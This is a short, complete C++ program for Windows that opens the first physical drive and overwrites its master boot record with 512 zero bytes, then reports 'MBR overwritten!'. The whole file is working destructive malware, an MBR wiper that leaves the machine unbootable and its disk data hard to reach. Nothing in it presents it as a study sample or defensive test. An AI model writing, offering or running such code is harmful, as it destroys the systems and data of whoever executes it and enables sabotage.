#include <Windows.h>
#include <iostream>
#include <stdexcept>
#include <vector>

constexpr DWORD MBR_SIZE = 512; // Size of the MBR

class FileHandle {
public:
  explicit FileHandle(HANDLE handle) : handle_(handle) {}
  ~FileHandle() { Close(); }

  FileHandle(const FileHandle &) = delete;
  FileHandle &operator=(const FileHandle &) = delete;

  FileHandle(FileHandle &&other) noexcept {
    handle_ = other.handle_;
    other.handle_ = INVALID_HANDLE_VALUE;
  }

  FileHandle &operator=(FileHandle &&other) noexcept {
    if (this != &other) {
      Close();
      handle_ = other.handle_;
      other.handle_ = INVALID_HANDLE_VALUE;
    }
    return *this;
  }

  HANDLE get() const { return handle_; }

private:
  HANDLE handle_;

  void Close() {
    if (handle_ != INVALID_HANDLE_VALUE) {
      CloseHandle(handle_);
      handle_ = INVALID_HANDLE_VALUE;
    }
  }
};

int main() {
  try {
    std::vector<char> mbrData(
        MBR_SIZE, 0); // Vector to store the MBR data, initialized with zeros

    // Open the drive to the physical memory
    FileHandle masterBootRecord(CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL,
                                           FILE_SHARE_READ | FILE_SHARE_WRITE,
                                           nullptr, OPEN_EXISTING, NULL,
                                           nullptr));
    if (masterBootRecord.get() == INVALID_HANDLE_VALUE) {
      throw std::runtime_error("Failed to open the drive. Error code: " +
                               std::to_string(GetLastError()));
    }

    DWORD bytesWritten; // Variable to store the number of bytes written

    // Write the data to the physical memory
    if (!WriteFile(masterBootRecord.get(), mbrData.data(), MBR_SIZE,
                   &bytesWritten, nullptr) ||
        bytesWritten != MBR_SIZE) {
      throw std::runtime_error("Failed to overwrite the MBR. Error code: " +
                               std::to_string(GetLastError()));
    }

    std::cout << "MBR overwritten!" << std::endl;

    std::cout << "Press Enter to exit...";
    std::cin.get();
  } catch (const std::exception &e) {
    std::cerr << "An error occurred: " << e.what() << std::endl;
    return EXIT_FAILURE;
  }

  return EXIT_SUCCESS;
}
